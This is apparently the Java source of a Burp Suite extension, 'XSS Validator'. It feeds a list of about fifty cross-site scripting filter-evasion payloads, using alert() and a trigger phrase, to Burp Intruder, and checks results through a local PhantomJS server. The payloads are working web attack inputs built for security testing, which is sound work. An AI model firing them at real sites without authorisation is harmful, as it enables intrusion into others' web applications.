package burp;
import burp.*;
import java.io.PrintWriter;
import java.util.ArrayList;
import java.util.List;

import org.apache.http.Header;
import org.apache.http.HttpResponse;
import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.entity.StringEntity;
import org.apache.http.impl.client.HttpClientBuilder;
import org.apache.http.message.BasicHeader;
import org.apache.http.util.EntityUtils;
import org.apache.http.NameValuePair;
import org.apache.http.message.BasicNameValuePair;

import org.apache.commons.codec.binary.Base64;

public class BurpExtender implements IBurpExtender, IHttpListener, IIntruderPayloadGeneratorFactory, IIntruderPayloadProcessor	{
	public burp.IBurpExtenderCallbacks mCallbacks;
	private IExtensionHelpers helpers;
	private PrintWriter stdout;
    private PrintWriter stderr;
    
    private HttpClient client;
    
    // Default server location for phantomJS Server
    // If you're using a customer server, please change and recompile.
    private static String phantomServer = "http://127.0.0.1:8093";
    
    private static String triggerPhrase = "f7sdgfjFpoG";
	
    /**
     * Initial Payloads containing trigger phrase, f7sdgfjFpoG.
     * 
     * The phantom server is designed to report XSS only if the
     * function calls contain the trigger phrase, suggesting
     * that it was passed via the Burp payload.
     * 
     * This is used to reduce the likelihood of false-positives.
     */
	public static final byte[][] PAYLOADS = {
		("<script>alert('" + triggerPhrase + "')</script>").getBytes(),
		("\"><script>alert('" + triggerPhrase + "')</script>").getBytes(),
		("'><script>alert('" + triggerPhrase + "')</script>").getBytes(),
		("<SCRIPT>alert('" + triggerPhrase + "');</SCRIPT>").getBytes(),
		("'';!--\"<" + triggerPhrase + ">=&{()}").getBytes(),
		("<IMG SRC=\"javascript:alert('" + triggerPhrase + "');\">").getBytes(),
		("<IMG SRC=javascript:alert('" + triggerPhrase + "')>").getBytes(),
		("<IMG SRC=JaVaScRiPt:alert('" + triggerPhrase + "')>").getBytes(),
		("<IMG SRC=javascript:alert(&quot;" + triggerPhrase + "&quot;)>").getBytes(),
		("<IMG SRC=`javascript:alert(\"RSnake says, '" + triggerPhrase + "'\")`>").getBytes(),
		("<IMG SRC=\"jav	ascript:alert('" + triggerPhrase + "');\">").getBytes(),
		("<IMG SRC=\"jav&#x09;ascript:alert('" + triggerPhrase + "');\">").getBytes(),
		("<IMG SRC=\"jav&#x0A;ascript:alert('" + triggerPhrase + "');\">").getBytes(),
		("<IMG SRC=\"jav&#x0D;ascript:alert('" + triggerPhrase + "');\">").getBytes(),
		("<IMG SRC=\" &#14;  javascript:alert('" + triggerPhrase + "');\">").getBytes(),
		("<IMG SRC=java%00script:alert(\\\"" + triggerPhrase + "\\\")>").getBytes(),
		("<SCR%00IPT>alert(\\\"" + triggerPhrase + "\\\")</SCR%00IPT>").getBytes(),
		("<IMG SRC=\"javascript:alert('" + triggerPhrase + "')\"").getBytes(),
		("<SCRIPT>a=/" + triggerPhrase + "/").getBytes(),
		("\\\";alert('" + triggerPhrase + "');//").getBytes(),
		("<INPUT TYPE=\"IMAGE\" SRC=\"javascript:alert('" + triggerPhrase + "');\">").getBytes(),
		("<BODY BACKGROUND=\"javascript:alert('" + triggerPhrase + "')\">").getBytes(),
		("<BODY ONLOAD=alert('" + triggerPhrase + "')>").getBytes(),
		("<IMG DYNSRC=\"javascript:alert('" + triggerPhrase + "')\">").getBytes(),
		("<IMG LOWSRC=\"javascript:alert('" + triggerPhrase + "')\">").getBytes(),
		("<BGSOUND SRC=\"javascript:alert('" + triggerPhrase + "');\">").getBytes(),
		("<BR SIZE=\"&{alert('" + triggerPhrase + "')}\">").getBytes(),
		("<LINK REL=\"stylesheet\" HREF=\"javascript:alert('" + triggerPhrase + "');\">").getBytes(),
		("<IMG SRC='vbscript:msgbox(\"" + triggerPhrase + "\")'>").getBytes(),
		("<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=javascript:alert('" + triggerPhrase + "');\">").getBytes(),
		("<META HTTP-EQUIV=\"Link\" Content=\"<javascript:alert('" + triggerPhrase + "')>; REL=stylesheet\">").getBytes(),
		("<META HTTP-EQUIV=\"refresh\" CONTENT=\"0; URL=http://;URL=javascript:alert('" + triggerPhrase + "');\">").getBytes(),
		("<IFRAME SRC=\"javascript:alert('" + triggerPhrase + "');\"></IFRAME>").getBytes(),
		("<FRAMESET><FRAME SRC=\"javascript:alert('" + triggerPhrase + "');\"></FRAMESET>").getBytes(),
		("<TABLE BACKGROUND=\"javascript:alert('" + triggerPhrase + "')\">").getBytes(),
		("<DIV STYLE=\"background-image: url(javascript:alert('" + triggerPhrase + "'))\">").getBytes(),
		("<DIV STYLE=\"background-image: url(&#1;javascript:alert('" + triggerPhrase + "'))\">").getBytes(),
		("<DIV STYLE=\"width: expression(alert('" + triggerPhrase + "'));\">").getBytes(),
		("<STYLE>@im\\port'\\ja\\vasc\\ript:alert(\"" + triggerPhrase + "\")';</STYLE>").getBytes(),
		("<IMG STYLE=\"" + triggerPhrase + ":expr/*" + triggerPhrase + "*/ession(alert('" + triggerPhrase + "'))\">").getBytes(),
		("<" + triggerPhrase + " STYLE=\"" + triggerPhrase + ":expression(alert('" + triggerPhrase + "'))\">").getBytes(),
		("exp/*<" + triggerPhrase + " STYLE='no\\" + triggerPhrase + ":no" + triggerPhrase + "(\"*//*\");").getBytes(),
		("<STYLE TYPE=\"text/javascript\">alert('" + triggerPhrase + "');</STYLE>").getBytes(),
		("<STYLE>." + triggerPhrase + "{background-image:url(\"javascript:alert('" + triggerPhrase + "')\");}</STYLE><A CLASS=" + triggerPhrase + "></A>").getBytes(),
		("<STYLE type=\"text/css\">BODY{background:url(\"javascript:alert('" + triggerPhrase + "')\")}</STYLE>").getBytes(),
		("<BASE HREF=\"javascript:alert('" + triggerPhrase + "');//\">").getBytes(),
		("<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:alert('" + triggerPhrase + "')></OBJECT>").getBytes(),
		("getURL(\"javascript:alert('" + triggerPhrase + "')\")").getBytes(),
		("<!--<value><![CDATA[<XML ID=I><X><C><![CDATA[<IMG SRC=\"javas<![CDATA[cript:alert('" + triggerPhrase + "');\">").getBytes(),
		("<META HTTP-EQUIV=\"Set-Cookie\" Content=\"USERID=&lt;SCRIPT&gt;alert('" + triggerPhrase + "')&lt;/SCRIPT&gt;\">").getBytes(),
		("<HEAD><META HTTP-EQUIV=\"CONTENT-TYPE\" CONTENT=\"text/html; charset=UTF-7\"> </HEAD>+ADw-SCRIPT+AD4-alert('" + triggerPhrase + "');+ADw-/SCRIPT+AD4-").getBytes(),
	};
	
	public void registerExtenderCallbacks(IBurpExtenderCallbacks callbacks) {
		mCallbacks = callbacks;
		
		this.client = HttpClientBuilder.create().build();
		helpers = callbacks.getHelpers();
		callbacks.setExtensionName("XSS Validator Payloads");
		stdout = new PrintWriter(callbacks.getStdout(), true);
        stderr = new PrintWriter(callbacks.getStderr(), true);
		callbacks.registerIntruderPayloadGeneratorFactory(this);
		callbacks.registerIntruderPayloadProcessor(this);
		callbacks.registerHttpListener(this);
	}
	
	@Override
	public String getGeneratorName() {
		return "XSS Validator Payloads";
	}
	
	@Override
    public IIntruderPayloadGenerator createNewInstance(IIntruderAttack attack)
    {
        // return a new IIntruderPayloadGenerator to generate payloads for this attack
        return new IntruderPayloadGenerator();
    }
    
    @Override
    public String getProcessorName() {
        return "XSS Validator";
    }
    
    @Override
    public byte[] processPayload(byte[] currentPayload, byte[] originalPayload, byte[] baseValue) {
    	return helpers.stringToBytes(helpers.urlEncode(helpers.bytesToString(currentPayload)));
    }
    
    /**
     * This function is called every time Burp receives an HTTP message.
     * We look specifically at messages that contain a toolFlag of 32,
     * indicating that the message is intended for the intruder. If it's
     * not, we don't care about it.
     * 
     * The function currently ignores requests, and handles only HTTP
     * responses. The response is captured and encoded, then passed
     * along to the phantomJS server for processing.
     * 
     * If the phantomJS server indicates a successful XSS attack,
     * append the phrase 'fy7sdufsuidfhuisdf' to the response.
     * 
     * We then use this phrase in accompaniment with intruders grep-match
     * functionality to determine whether the specific payload triggered
     * xss.
     */
	public void processHttpMessage(int toolFlag, boolean messageIsRequest, IHttpRequestResponse messageInfo) {
        if (toolFlag == 32 && messageIsRequest) {
        	// Manipulate intruder request, if necessary
        } else if (toolFlag == 32 && ! messageIsRequest) {
        	stdout.println("Response Received");
        	HttpPost PhantomJs = new HttpPost(phantomServer);
        	
        	try {
        		byte[] encodedBytes = Base64.encodeBase64(messageInfo.getResponse());
        		String encodedResponse = helpers.bytesToString(encodedBytes);
        		
	        	List<NameValuePair> nameValuePairs = new ArrayList<NameValuePair>(1);
	        	nameValuePairs.add(new BasicNameValuePair("http-response", encodedResponse));
	        	
	        	PhantomJs.setEntity(new UrlEncodedFormEntity(nameValuePairs));

	        	HttpResponse response = client.execute(PhantomJs);
	        	String responseAsString = EntityUtils.toString(response.getEntity());
	            
            	stdout.println("Response: " + responseAsString);
            	
	            // parse response for XSS by checking whether it contains 
            	// the trigger phrase
	            if(responseAsString.contains(triggerPhrase)) {
	            	// Append weird string to identify XSS
		            String newResponse = helpers.bytesToString(messageInfo.getResponse()) + "fy7sdufsuidfhuisdf";
	            	messageInfo.setResponse(helpers.stringToBytes(newResponse));
	            	stdout.println("XSS Found");
	            }
	            
        	} catch (Exception e) {
        		stderr.println(e.getMessage());
        	}
        }
	}
	
	/**
	 * 
	 * Basic class to generate intruder payloads.
	 * 
	 * In this case, simply iterate over the payloads defined
	 * in the parent class.	
	 */
	class IntruderPayloadGenerator implements IIntruderPayloadGenerator {
		int payloadIndex;
		
		@Override
		public boolean hasMorePayloads() {
			return payloadIndex < PAYLOADS.length;
		}
		
		@Override
		public byte[] getNextPayload(byte[] baseValue) {			
			byte[] payload = PAYLOADS[payloadIndex];
			payloadIndex++;
			return payload;
		}
		
		@Override
		public void reset() {
			payloadIndex = 0;
		}
		
	}
}
